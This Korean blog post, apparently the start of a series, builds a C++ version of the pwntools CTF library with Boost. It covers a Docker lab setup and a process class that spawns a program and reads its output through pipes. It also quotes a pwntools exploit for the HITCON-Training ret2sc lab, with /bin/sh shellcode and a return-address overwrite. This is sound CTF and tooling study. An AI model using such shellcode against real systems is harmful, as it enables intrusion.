
pwntools는 CTF에 관심있는 사람이라면 한번쯤은 들어봤을 법한 pwnable을 위한 전용 도구이다. ([https://github.com/Gallopsled/pwntools](https://github.com/Gallopsled/pwntools))

python으로 제작된 이 도구는 ctf에서 pwnable을 빠르게 진행할 수 있도록 각종 편의 기능을 보유하고 있어 매우 편리하다.
만약 비교적 최근에 pwnable을 시작한 newbie라면 hexray(IDA)와 pwntools 없이는 pwnable이 불가능할 수도 있을만큼 필수적인 도구로 자리매김하고 있다.

취미 생활로 CTF 풀이를 할 때마다 예전 버릇이 남아있어 주로 cpp로 exploit 코드를 작성하곤 했는데, 아무래도 pwntools가 엄청 편리한지라 라이브러리를 한번 찾아보게 되었다.
github에 몇 개의 비슷한 프로그램이 있기는 했지만 딱히 마음에 드는 게 없어서 직접 만들어보기로 결심하였고, 모자란 기억을 보충하기 위해 개발 히스토리를 블로그에 남겨보고자 한다.

가급적 노가다를 줄이기 위해 boost([https://www.boost.org/](https://www.boost.org/))를 이용해 개발하기로 하였다.(사실 왜 boost로 시작했는지 잘 기억은 안나는데, 매뉴얼 및 사용층이 부족한 boost를 선택한 것이 과연 노가다를 줄이기는 한 건지 좀 의심되기는 한다;;;).
그리고 프로그램의 테스트는 Hitcon-Trainning([https://github.com/scwuaptx/HITCON-Training](https://github.com/scwuaptx/HITCON-Training)) 문제를 사용하기로 했다.

## **환경 구축**

pwntoolcpp의 최종 형태는 라이브러리가 될  예정이지만 쉽고 빠르고 간단한 테스트를 위해 일단 하나의 프로그램에서 동작하도록 작성하기로 한다.
~/workspaces 아래에 ptcpp라는 디렉토리를 생성하여 docker 실행 시 연결되도록 하고, 소스 에디팅은 Host에서, compile만 docker에서 하도록 하였다.

아래 dockerfile과 run.sh를 이용해 테스트 환경을 구축하자.

```docker
FROM ubuntu:latest

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update --fix-missing \
  && apt-get -y install locales \
  && locale-gen en_US.UTF-8 \
  && apt-get -y install gcc net-tools vim nano gdb python3 wget git make procps gcc-multilib socat cmake \
                       	libpcre3-dev libdb-dev libxt-dev libxaw7-dev curl binutils nasm bash-completion \
                       	build-essential software-properties-common g++-multilib libssl-dev apport \
                       	python3-pip python-dev netcat sudo libc6-dbg-i386-cross libc6-dbg telnet \
                        libc6-i386 libboost-all-dev \
  && adduser --disabled-password --gecos '' guest \
  && echo 'guest:guest' | chpasswd \
  && wget -O /home/guest/.gdbinit-gef.py -q http://gef.blah.cat/py \
  && echo "source /home/guest/.gdbinit-gef.py" > "/home/guest/.gdbinit" \
  && echo "catch exec" | cat >> /home/guest/.gdbinit \
  && echo "set follow-fork-mode child" | cat >> /home/guest/.gdbinit \
  && chown guest:guest /home/guest/.gdbinit-gef.py /home/guest/.gdbinit \
  && python3 -m pip install --upgrade pip \
  && python3 -m pip install pwntools \
  && python3 -m pip install setuptools \
  && curl https://bootstrap.pypa.io/get-pip.py --output get-pip.py \
  && python2 get-pip.py \
  && python2 -m pip install pwntools \
  && echo "%sudo ALL=(ALL:ALL) ALL" | cat >> /etc/sudoers \
  && usermod -aG sudo guest 

RUN dpkg --add-architecture i386 \
  && git clone https://github.com/scwuaptx/HITCON-Training /tmp/hitcon

WORKDIR /home/guest/ptcpp
```

```bash
#!/bin/bash

TAG=build
HOME=/home/lucid7 **<== 수정 필요**
docker build --tag $TAG .
docker run --cap-add=SYS_PTRACE \
           --security-opt seccomp=unconfined \
           --name $TAG \
           --user guest \
           --hostname $TAG \
           --entrypoint /bin/bash \
           -it \
           --volume $HOME/workspaces/ptcpp:/home/guest/ptcpp \
           $TAG
```


약간의 시간이 흐른 후 아래와 같이 docker 개발 환경 구축이 완성된다.
![full](/assets/images/docker.png)


## **문제 확인**

HITCON LAB3 문제를 확인해보자.
해당 파일은 /tmp/hitcon 디렉토리 안에 위치해 있다.
ret2sc.c 소스를 보면 아래와 같이 가장 기초적인 문제임을 알 수 있다.

![full](/assets/images/ret2sc.c.png)

<br><br>
해당 문제를 검색해 보면 다음과 같은 풀이집이 있다. ([https://ii4gsp.tistory.com/97](https://ii4gsp.tistory.com/97)). 
아래는 해당 풀이집에서 발췌한 pwntools를 이용한 exploit code이다.
```python
from pwn import *

p = process('/home/ii4gsp/HITCON-Training/LAB/lab3/ret2sc')
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'
name = 0x804a060

p.recvuntil(':')
p.sendline(shellcode)

payload = ''
payload += '\x90' * 32
payload += p32(name)

p.recvuntil(':')
p.sendline(payload)

p.interactive()
```

위의 python 코드를 보면 ":" 문자열이 나올때까지 출력을 읽어(recvuntil) 특정 값을 쓰는(sendline) 동작을 2번 반복한 다음 마지막으로 interactive() 함수를 호출한다.

위의 exploit code에서 ret2sc 패스만 수정하여 실행해보면 아래와 같이 정상적으로 shell을 획득하는 것을 볼 수 있다.
![full](/assets/images/ret2sc.png)


지금까지 cpp를 이용한 pwntools를 제작하기 위한 개발환경 구축 및 pwntools를 이용한 exploit 코드의 기본적인 동작을 분석하였다.
다음으로 위의 코드를 기반으로 pwntoolcpp를 제작해 볼 것이다.
우리가 만들어야 할 기본 기능은 process라는 클래스와 recvuntil(), sendline(), p32(), interactive() 멤버 함수이다.



## **PROCESS 클래스**

먼저 process 클래스를 만들어보자. process 클래스는 매개변수로 전달받은 실행파일을 실행하고, console과 해당 프로세스 사이에서의 입출력을 전달한다.

일반적으로 C 프로그램에서 이 기능을 하기 위해서는 fork를 해서 child process의 pipe를 조정해서 입출력을 전달해야 한다.(매우 귀찮은 작업이다). 하지만 C++에서는 boost 라이브러리의 boost::process::child 클래스([https://www.boost.org/doc/libs/1_75_0/doc/html/boost/process/child.html](https://www.boost.org/doc/libs/1_75_0/doc/html/boost/process/child.html))로 쉽고 편하게 사용할 수 있다.

boost::process::child는 실행할 프로그램의 path를 전달하여 간단히 사용할 수도 있으며, 입출력을 redirect 하려면 아래와 같이 pipe 생성 후 매개변수로 전달하기만 하면 된다.
```cpp
std::string m_path;    // 실행할 파일의 경로
boost::asio::io_context io;
boost::process::async_pipe input(io);
boost::process::async_pipe output(io);
boost::process::async_pipe error(io);

boost::process::child process(m_path,
                              boost::process::std_out > output,
                              boost::process::std_in < input,
                              boost::process::std_err > error,
                              io);
```

<br><br>
만약 실행해야 할 프로그램이 입력 값을 받는다면 아래와 같이 입력 값을 string vector로 전달하기만 하면 된다.
```cpp
std::string m_path;    // 실행할 파일의 경로
boost::asio::io_context io;
boost::process::async_pipe input(io);
boost::process::async_pipe output(io);
boost::process::async_pipe error(io);
std::vector<std::string> args;    // 입력 값 vector

boost::process::child process(m_path,
                              boost::process::args(args),
                              boost::process::std_out > output,
                              boost::process::std_in < input,
                              boost::process::std_err > error,
                              io);
```

<br><br>
  
제대로 동작하는지 ret2sc 바이너리를 대상으로 아래와 같이 테스트 코드를 작성하고 실행해보자.
```cpp
#include <iostream>
#include <boost/process.hpp>
#include <boost/asio.hpp>
#include <boost/thread.hpp>
#include <boost/chrono.hpp>
#include <mutex>

class PROCESS
{

private:
    std::string m_path;
    boost::asio::io_context io;
    boost::process::async_pipe input;
    boost::process::async_pipe output;
    boost::process::async_pipe error;
    boost::process::child c;
    boost::system::error_code ec;

public:

    PROCESS(const std::string& _path)
    : m_path(_path),
      input(io),
      output(io),
      error(io),
      c(m_path,
        boost::process::std_out > output,
        boost::process::std_in < input,
        boost::process::std_err > error,
        io)
        {
            init();
        }

    PROCESS(const std::string& _path, const std::vector<std::string>& args)
    : m_path(_path),
      input(io),
      output(io),
      error(io),
      c(m_path,
        boost::process::args(args),
        boost::process::std_out > output,
        boost::process::std_in < input,
        boost::process::std_err > error,
        io)
        {
            init();
        }

    ~PROCESS()
    {
        std::cout << "[*] Stopping process... pid is " << std::to_string(c.id()) << std::endl;
        c.terminate();
    }

private:
    void init()
    {
        std::cout << "[*] Starting process... pid is " << std::to_string(c.id()) << std::endl;
        io.run();
    }

};

int main()
{
    try
    {
        PROCESS process3{"/tmp/hitcon/LAB/lab3/ret2sc"};
    }
    catch (std::exception& e)
    {
        std::cerr << "Exception: " << __FUNCTION__ << " " << e.what() << "\n";
    }

    return 0;
}
```

<br><br>
컴파일을 위한 Makefile은 아래와 같다.
```cpp
GCC=/usr/bin/g++
CFLAGS= -c -pipe -O2 -std=gnu++1z -Wall -Wextra -fPIC
OBJS= main.o
TARGET=pwntools_test

all: $(TARGET)

$(TARGET): $(OBJS)
	$(GCC) -Wl,-O1 -o $(TARGET) main.o  -L. -lpthread -lboost_thread -lboost_chrono

main.o : main.cpp
	$(GCC) $(CFLAGS) -o main.o main.cpp -I.

clean:
	rm -f *.o *.core *~
	rm -f $(TARGET)
```

<br><br>
아래와 같이 ptcpp 디렉토리 밑에 위의 소스를 생성한 후 make 명령어로 컴파일을 한다.
![full](/assets/images/make.png)

<br><br>
컴파일에 성공하면 아래와 같이 pwntools_test 파일이 생성된다.
![full](/assets/images/test.png)

<br><br>
아래는 생성된 pwntools_test 파일을 실행한 결과이며, ret2sc 바이너리가 child process로 생성되었다가 정상적으로 종료되었다.
![full](/assets/images/test.png)


다음으로 추가할 기능은 프로세스를 처음 실행했을 때 출력되는 문자열을 읽어서 화면에 출력하는 기능이다. "/tmp/hitcon/LAB/lab3/ret2sc"를 실행시키면 아래와 같이 "Name:" 문자열이 출력한 후 사용자로부터의 입력을 기다리는 상태가 된다.

![full](/assets/images/cons.png)

<br><br>
우리는 위에서 boost::process::child로 대상 프로그램을 child process로 생성할 때, 해당 프로그램의 stdout을 output pipe로 redirect 하였으므로, output pipe을 읽어서 화면에 출력하면 될 것이다.

boost에서 pipe를 읽는 여러 방법들 중 boost::asio::read()를 사용하면 가장 간단하게 구현할 수 있다.
([https://www.boost.org/doc/libs/1_74_0/doc/html/boost_asio/reference/read.html](https://www.boost.org/doc/libs/1_74_0/doc/html/boost_asio/reference/read.html))

<br><br>
아래는 boost::asio::read()를 사용하는 예제이다.
```cpp
boost::asio::streambuf buf;    // pipe에서 읽은 data를 저장하는 buffer
buf.prepare(4096);             // buffer의 크기 설정

auto size = boost::asio::read(output, buf, boost::asio::transfer_at_least(1), ec);
std::cout << std::string(buffers_begin(buf.data()), buffers_begin(buf.data()) + size) << std::endl;
buf.consume(size);
```

먼저 pipe에서 읽은 data를 저장할 stream buffer를 선언하고, 충분한 크기로 설정한다.
([https://www.boost.org/doc/libs/1_74_0/doc/html/boost_asio/reference/streambuf.html](https://www.boost.org/doc/libs/1_74_0/doc/html/boost_asio/reference/streambuf.html))

boost의 stream buffer는 이름 그대로 stream data를 저장하는 buffer이고, 일반적으로 사용되는 buffer와는 사용방법이 조금 틀리다.
간단히 설명하면 streabuf는 읽기와 쓰기를 위한 2개의 인덱스를 가지고 있는데 읽기/쓰기 후에는 반드시 이 인덱스들의 위치를 변경해야 한다.
<br>위의 예제 코드 가장 마지막 라인에서는 읽기 작업 후, read()에서 반환된 size만큼 consume()을 호출해서 인덱스를 변경하였다. 만약 streambuf에 쓰기 작업을 하였다면, commit() 함수를 반드시 호출해 주어야한다.

또한 read() 함수는 전통적인 c에서의 read() 함수와 달리 리턴되기 전에 스트림에서 일정한 양의 데이터를 읽어서 buffer에 저장하는 역할을 한다. 따라서 원래 읽기를 원했던 전체 길이 중 일부분이 먼저 buffer에 저장된 채로 반환될 수 있기 때문에, stream buffer의 consume()을 반드시 호출해야만 순차적으로 data를 저장할 수 있다.
<br>앞에서 이야기한 일정한 양은 read() 함수에 전달되는 세번째 변수에 의해 정해지는데, 위의 예제에서는 boost::asio::transfer_at_least(1) 값이 전달되어, 최소 1개 이상의 data를 읽으면 반환하도록 되어 있다.

<br><br>여기서 또 혼돈을 일으킬만한 것이 boost::asio::transfer_at_least(1)을 전달했을 경우 buffer에 저장된 data의 길이가 1이 아닐 수도 있다는 것이다.
<br>위의 코드에서 read() 함수가 반환되었을 때 buffer에 저장된 data의 정확한 크기는 알 수 없다. 이는 boost 매뉴얼에도 정의되어 있지 않은데, stream buffer의 크기가 클수록 한번에 읽어들이는 크기가 크다는 것은 실험을 통해서 알 수 있었다. <br>따라서 boost::process::child로 실행시킬 프로그램이 출력하는 data가 많을수록 stream buffer의 크기 또는 boost::asio::transfer_at_least()의 값을 크게 설정해야만 전체 data를 한번에 읽을 수 있다.

위의 코드에서는 대상 프로그램이 출력하는 데이터의 크기를 알 수 없기 때문에(만약 10으로 설정했는데, 출력되는 값이 10 미만이라면 read()가 반환되지 않아 프로그램이 멈출 것이다), boost::asio::transfer_at_least()의 값을 1로 설정하여, 1개 이상의 data를 읽으면 반환하도록 하였다. 그리고 stream buffer의 크기를 크게 잡음으로써, 만약 큰 크기의 출력값이 발생하더라도 한번에 읽을 수 있도록, 최대한 안정적으로 동작하게끔 하였다.
<br>만약 정확히 1개의 data만을 읽고 싶다면, boost::asio::transfer_exactly(1)을 전달해야 한다. 만약 모든 데이터를 읽은 후 반환되게 하고 싶다면(sync처럼 동작하게끔 하고 싶다면), 세번째 변수에 boost::asio::transfer_all()을 전달해야만 한다.

<br><br>
한가지 더 고려해야 하는 사항은 바로 read() 호출이 반환이 되지 않는 상황이다. 예를 들어 10개의 data가 들어올 것으로 예상해서 read()를 호출하였는데, 실제 8개의 data만을 읽을 수 있었다면, read()는 이후의 data가 들어올 때까지 계속 대기상태에 머무른다. 또한 대상 프로그램에서 읽어야 할 data가 있는지 없는지 모르는 상황에서의 read() 호출은 예상치 못한 대기상태를 야기하게 되므로, 적당한 시간 이후에 read() 호출을 강제로 끝내야만 프로그램이 안정적으로 동작할 것이다. 따라서 read() 호출은 비동기 함수 또는 스레드로 이루어져야 한다.

아래는 스레드 내에서 read()를 호출하도록 구현한 코드 예제이다.

```cpp
boost::thread out_thread([&]()
{
    boost::asio::streambuf buf;
    buf.prepare(buffer_length);
    if(const auto size{boost::asio::read(output, buf, boost::asio::transfer_at_least(1), ec)}; size != 0)
    {
        locked_output(buffer_to_string(buf, size));
        buf.consume(size);
    }
});
out_thread.try_join_for(boost::chrono::milliseconds(200));
```

thread 내에서 1개 이상의 data를 읽어오면 반환되도록 read()를 호출하며, out_buffer에 저장된 data를 출력한다. 읽어온 data의 수만큼 consume()을 호출하여 index를 조절한다. 이 스레드는 만약 read() 함수가 응답이 없을 경우 200ms 후에 종료된다.

<br><br>
마지막으로 고려해야 하는 상황은 바로 error이다.
<br>특정 프로그램을 실행했을 때 어떠한 이유로 인해 error가 발생할 수도 있다. unix 기반 프로그램에서 error는 일반적으로 stderr로 전달되므로, 우리는 child process에서 발생하는 error 메세지 확인을 위해 stderr을 redirect한 후 이를 읽어보아야 한다.

아래는 역시 스레드 내에서 error code를 읽는 read()를 호출하도록 구현된 코드 예제이다.

```cpp
boost::thread error_thread([&]()
{
    boost::asio::streambuf buf;
    buf.prepare(buffer_length);
    if(const auto size{boost::asio::read(error, buf, boost::asio::transfer_at_least(10), ec)}; size != 0)
    {
        locked_output(buffer_to_string(buf, size));
        buf.consume(size);
    }
});
error_thread.try_join_for(boost::chrono::milliseconds(200));
```
<br>
스레드에서 출력하기 때문에, 예쁜 출력을 위해 locked_output() 이라는 함수를 아래와 같이 추가하였다.

```cpp
void locked_output(const std::string& s)
{
    std::lock_guard<std::recursive_mutex> guard(lock);
    std::cout << s << std::endl;
}
```
<br><br>
아래는 지금까지 확인한 사항들이 모두 반영된 테스트 코드 및 실행결과이다.

```cpp
#include <iostream>
#include <boost/process.hpp>
#include <boost/asio.hpp>
#include <boost/thread.hpp>
#include <boost/chrono.hpp>
#include <mutex>

class PROCESS
{

private:
    std::string m_path;
    boost::asio::io_context io;
    boost::process::async_pipe input;
    boost::process::async_pipe output;
    boost::process::async_pipe error;
    boost::process::child c;
    boost::system::error_code ec;

    std::recursive_mutex lock;
    const int buffer_length{4096};

public:

    PROCESS(const std::string& _path)
    : m_path(_path),
      input(io),
      output(io),
      error(io),
      c(m_path,
        boost::process::std_out > output,
        boost::process::std_in < input,
        boost::process::std_err > error,
        io)
        {
            init();
        }

    PROCESS(const std::string& _path, const std::vector<std::string>& args)
    : m_path(_path),
      input(io),
      output(io),
      error(io),
      c(m_path,
        boost::process::args(args),
        boost::process::std_out > output,
        boost::process::std_in < input,
        boost::process::std_err > error,
        io)
        {
            init();
        }

    ~PROCESS()
    {
        std::cout << "[*] Stopping process... pid is " << std::to_string(c.id()) << std::endl;
        c.terminate();
    }

private:
    void init()
    {
        std::cout << "[*] Starting process... pid is " << std::to_string(c.id()) << std::endl;
        read_at_once();
        io.run();
    }

    const std::string buffer_to_string(const boost::asio::streambuf &buffer, const size_t& size)
    {
        return {buffers_begin(buffer.data()), buffers_begin(buffer.data()) + size};
    }

    void read_at_once()
    {
        boost::thread out_thread([&]()
        {
            boost::asio::streambuf buf;
            buf.prepare(buffer_length);
            if(const auto size{boost::asio::read(output, buf, boost::asio::transfer_at_least(1), ec)}; size != 0)
            {
                locked_output(buffer_to_string(buf, size));
                buf.consume(size);
            }
        });
        out_thread.try_join_for(boost::chrono::milliseconds(200));
        
        boost::thread error_thread([&]()
        {
            boost::asio::streambuf buf;
            buf.prepare(buffer_length);
            if(const auto size{boost::asio::read(error, buf, boost::asio::transfer_at_least(10), ec)}; size != 0)
            {
                locked_output(buffer_to_string(buf, size));
                buf.consume(size);
            }
        });
        error_thread.try_join_for(boost::chrono::milliseconds(200));
    }

    void locked_output(const std::string& s)
    {
        std::lock_guard<std::recursive_mutex> guard(lock);
        std::cout << s << std::endl;
    }

};

int main()
{
    try
    {
        PROCESS p{"/tmp/hitcon/LAB/lab3/ret2sc"};
    }
    catch (std::exception& e)
    {
        std::cerr << "Exception: " << __FUNCTION__ << " " << e.what() << "\n";
    }

    return 0;
}
```

![full](/assets/images/process.png)


여기까지 Process 클래스의 가장 기본적인 기능이 구현되었다. 이제 다음은 recvuntil()을 구현해 볼 차례이다.
